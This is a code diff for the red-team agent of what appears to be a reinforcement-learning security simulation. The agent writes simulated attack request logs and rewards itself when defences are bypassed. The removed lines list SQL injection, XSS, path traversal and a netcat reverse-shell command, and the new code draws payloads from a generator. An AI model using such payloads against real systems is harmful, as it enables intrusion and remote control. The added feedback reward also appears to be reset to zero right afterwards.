@@ -10,6 +10,7 @@ import time
 import random
 import utils
 import config
+import payload_factory
 
 # --- SYSTEM CONFIGURATION ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -47,7 +48,11 @@ def engage_offense():
     q_manager = utils.QTableManager("red", ACTIONS)
 
     threat_loader = utils.SmartJSONLoader(THREAT_DB_FILE, {'hashes': [], 'filenames': []})
+    payload_gen = payload_factory.PayloadGenerator()
     step_count = 0
+
+    # Feedback Loop State
+    last_web_attack_id = None
 
     # Local optimizations
     _random = random.random
@@ -167,25 +172,40 @@ def engage_offense():
                 except: pass
 
             elif action == "T1190_WEB_EXPLOIT":
-                # Web Attack: SQLi, XSS, etc.
-                # Generate "network traffic" file: http_req_{IP}_{ID}.log
+                # Advanced Web Attack with Feedback Loop
                 ip = f"192.168.1.{random.randint(10, 200)}"
-                req_id = random.randint(1000, 9999)
+                req_id = random.randint(10000, 99999)
                 fname = f"{TARGET_DIR}/http_req_{ip}_{req_id}.log"
 
-                payloads = [
-                    "GET /search?q=' OR 1=1 --", # SQLi
-                    "POST /login USER=admin&PASS=' OR '1'='1", # SQLi
-                    "GET /comment?msg=<script>alert(1)</script>", # XSS
-                    "GET /index.php?page=../../etc/passwd", # LFI
-                    "GET /api/v1/status | nc -e /bin/sh 10.0.0.1 4444" # RCE
-                ]
+                # Choose Attack Type
+                atype = _choice(["SQLi", "XSS", "RCE"])
+                payload = payload_gen.generate(atype)
+
+                # Check previous success/fail (Learning from Feedback)
+                # If we were blocked recently, we might get negative reward, but here we just try hard.
 
                 try:
                     with open(fname, 'w') as f:
-                        f.write(_choice(payloads))
+                        f.write(f"GET /?q={payload} HTTP/1.1\nHost: target")
                     impact = 6
+                    last_web_attack_id = req_id
                 except: pass
+
+            # Check for Feedback (Did we succeed?)
+            if last_web_attack_id:
+                resp_200 = os.path.join(TARGET_DIR, f"http_resp_{last_web_attack_id}_200.log")
+                resp_403 = os.path.join(TARGET_DIR, f"http_resp_{last_web_attack_id}_403.log")
+
+                if os.path.exists(resp_200):
+                    reward += 10 # Massive reward for bypassing defenses
+                    logger.info(f"ATTACK SUCCESS: {last_web_attack_id} bypassed defenses!")
+                    utils.secure_delete(resp_200)
+                    last_web_attack_id = None
+                elif os.path.exists(resp_403):
+                    reward -= 5 # Penalty for getting blocked
+                    logger.info(f"ATTACK BLOCKED: {last_web_attack_id} failed.")
+                    utils.secure_delete(resp_403)
+                    last_web_attack_id = None
 
             # 4. REWARDS
             reward = 0
